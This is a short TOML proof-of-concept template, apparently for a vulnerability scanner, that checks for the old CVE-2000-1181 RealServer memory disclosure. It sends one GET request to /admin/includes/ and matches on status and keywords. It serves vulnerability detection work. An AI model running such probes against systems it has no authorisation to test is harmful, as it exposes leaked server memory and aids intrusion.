[info]
author = "ave"
description = "通过访问 RealServer 的 /admin/includes/ 路径验证内存内容泄露漏洞。该漏洞允许未认证远程攻击者获取服务器进程内存中的敏感数据。"
id = "POC-AVE-2000-0836"
name = "CVE-2000-1181 RealServer Memory Contents Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0836"]
vuln_id = [
    "CVE-2000-1181",
    "AVE-2000-0836",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin/includes/"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE-PoC/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "RealServer",
    "real",
]
